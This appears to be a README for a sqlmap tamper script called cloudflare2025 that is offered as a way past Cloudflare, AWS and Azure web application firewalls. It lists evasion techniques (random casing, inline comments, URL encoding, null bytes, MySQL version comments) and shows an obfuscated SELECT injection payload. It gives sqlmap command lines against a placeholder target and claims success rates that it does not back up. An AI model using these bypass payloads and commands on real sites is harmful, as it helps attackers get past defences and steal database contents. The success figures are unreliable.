## Tamper Scripts

### cloudflare2025.py

**Description:** Advanced Cloudflare WAF bypass using 2025 techniques

**Techniques:**
1. Random case variation (`SeLeCt`)
2. Comment injection (`/**/`, `%00`)
3. URL encoding (`%3D`, `%27`)
4. Null byte injection (`SEL%00ECT`)
5. MySQL version comments (`/*!12345SELECT*/`)
6. Multiple evasion layers

**Example:**
```
Original:  SELECT * FROM users WHERE id=1
Bypassed:  SeLeCt/**/%2A/**/FrOm/**/users/**/WhErE/**/id%3D1
```

**Usage:**
```bash
python sqlmap.py -u "https://target.com/page?id=1" --tamper=cloudflare2025
```

**Tested Against:**
- Cloudflare WAF (2024-2025)
- AWS WAF
- Azure WAF

## How It Works

### Technique 1: Random Case Variation
```python
# Original: SELECT
# Result: SeLeCt (random case)
```

### Technique 2: Comment Injection
```python
# Spaces replaced with:
- /**/
- /*%00*/
- /*!50000*/
- %0A, %09, %0D
```

### Technique 3: Encoding
```python
# Special characters encoded:
= → %3D
< → %3C
> → %3E
' → %27
```

### Technique 4: Null Bytes
```python
# Original: SELECT
# Result: SEL%00ECT
```

## Success Rate

| WAF | Success Rate |
|-----|--------------|
| Cloudflare | ~70% |
| AWS WAF | ~65% |
| Azure WAF | ~60% |
| Generic WAF | ~75% |

---

## Advanced Usage

### Combine with Other Techniques
```bash
python sqlmap.py -u "https://target.com/page?id=1" \
  --tamper=cloudflare2025 \
  --random-agent \
  --delay=2 \
  --threads=1
```

### Test Tamper Script
```python
from cloudflare2025 import tamper

payload = "SELECT * FROM users WHERE id=1"
result = tamper(payload)
print(f"Original: {payload}")
print(f"Bypassed: {result}")
```
